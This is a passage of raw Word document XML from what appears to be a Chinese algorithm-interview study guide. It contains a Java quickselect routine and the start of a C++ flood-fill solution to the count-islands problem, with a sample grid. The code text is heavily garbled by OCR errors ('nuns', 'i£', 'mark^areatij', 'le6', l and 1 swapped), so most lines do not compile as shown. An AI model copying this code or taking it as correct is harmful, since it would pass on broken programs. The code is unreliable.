        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="16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420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">return helper (nums, 0, nums. length </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1, nums. length ~ k + 1);</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330" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:hanging="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public static int helper(int[] nums, int L int r, int k) { if (1 == r) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return nums[1];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>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int position = partition(nuns, 1, r);</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 xml:space="preserve">i£ (position +1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">-- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>k) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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return nums[position];</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 else if (position + 1 &lt; k； {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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return helper(nums, position + 1, r, k);</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 else {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="700" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">return helper(nums, L position </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>L k);</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 xml:space="preserve">public static int partitiontint.] nums, int 1, int r) { int left </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= 1, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">right </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>r;</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int pivot = nums[left];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while (left &lt; right) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while (left &lt; right &amp;&amp; nums[right] &gt;= pivot) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2080" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>right—;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="16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line="240" w:lineRule="auto"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>nums[left] = nums[right.;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while (left &lt; right &amp;&amp; nums[left] &lt;= pivot) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2080" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>left++;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="16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660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>nums[right] = nums[left.;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nums[left] = pivot;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return left;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="84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60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="240" w:line="630" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>36.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>分输入是以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>表示的一张地图，其中</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代表陆地，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>代表海洋。岛屿是</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上下左右相连通的区域。(不包括对角 线)输岀是岛屿的个数。可以认为地图的周围都是海洋。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="625" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>此题的另一个版本要求同时输岀最大区域的面积</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(</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的个 数);输入先给岀两个整数作为数组的长和宽，各元素之间 有空格隔开。本题的输入是直接给出数组内容且元素之间没 有空格，读取输入并获得数组的维度有一定技巧。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="80" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>献醐</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="3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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>11000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="3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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>11000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="3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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>00100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="3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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>00011</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="660" w:line="627" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>融</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include &lt;cstdio&gt;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include "string,</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typedef struct node{</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bool island;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>} Node;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int row = 0, col = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Node map[1000][1000];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void mark_area(int i, int j){ /*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>右隽的节点</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>*/ if(j+1 &lt; col &amp;&amp; map[i][j+1].island){ map[i][j+1]. island = false; mark^areatij j+1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="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r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>下方的节点</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if(i+1 &lt; row &amp;&amp; map[i+1][j]. island){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map[i+1][j]. island = false; mark_area (i+L j);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="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r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>左方的节点</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if (j~l &gt;=0 &amp;&amp; map[i][j-1].island){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map[i][j~l]. island = false; mark^areatij j~l);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="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r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>上方的节点</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if (i-1 &gt;=0 &amp;&amp; map[i-l] [j]. island) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>mapfi"l] [j].island = false; mark_area(i~l, j);</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return;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="4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315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int main(int argc, char **argv){</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r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数组清零</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memset(map, 0, sizeof(Node) * le6);</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A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>输入读耿</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char n;</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i = 0, j = 0;</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while(true){</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 xml:space="preserve">if (scanf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
